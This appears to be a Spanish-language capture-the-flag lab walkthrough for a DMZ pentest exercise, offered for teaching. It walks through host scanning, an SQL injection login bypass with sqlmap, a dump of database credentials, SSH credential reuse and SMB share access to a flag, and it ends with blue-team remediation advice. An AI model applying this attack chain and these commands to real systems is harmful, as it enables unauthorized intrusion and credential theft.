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WALKTHROUGH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del laboratorio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inyección SQL web al recurso Samba interno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DMZ Pentest Lab — Lateral Movement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SQLi → creds BD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fedora-ssh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reutilizar creds (SSH)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opensuse-smb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recurso → botín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Sigue el hilo de credenciales por la DMZ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Reconocimiento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172.30.0.0/24                     # descubre hosts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-p 21,22,80,139,445,5432 172.30.0.0/24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 hosts y servicios antes de tocar nada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Acceso inicial (SQLi)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login es vulnerable a inyección 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usuario:    admin' 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  lo que sea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automatiza:  sqlmap -u http://172.30.0.10/login.php --data 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concatena el input directamente en la query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Initial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Acceso a credenciales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las creds están en el config web y en la base de datos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-h 172.30.0.10 -U webapp -d webapp -c 'SELECT * FROM users;'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svc_backup : B@ckup#2024!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Vuelca la tabla users; fíjate en la cuenta svc_backup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Credential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— Movimiento lateral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contraseña de la BD se reutiliza en el usuario Linux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svc_backup@172.30.0.20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password: B@ckup#2024!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reutilización de credenciales es el pivote a fedora-ssh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Lateral Movement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— Recolección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~/.smbcredentials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username=smbbackup  password=Sh@re#Backup22!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share=//172.30.0.30/backup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credenciales del siguiente salto quedaron en disco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Collection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6 — Objetivo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smbclient //172.30.0.30/backup -U smbbackup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smb: \&gt; get flag.txt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flag.txt   # FLAG{lateral_movement_complete}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 el botín del recurso Samba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completa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de la DMZ encadenando tres pequeñas malas configuraciones.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y remediación (blue team)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consultas parametrizadas — elimina la inyección SQL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guardes credenciales en ficheros legibles por web ni las reutilices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dejes secretos en disco en los directorios home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 la DMZ y vigila la autenticación SSH/SMB por reutilización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2026-08-01T16:28:52Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-01T16:28:52Z</dcterms:modified>
</cp:coreProperties>
</file>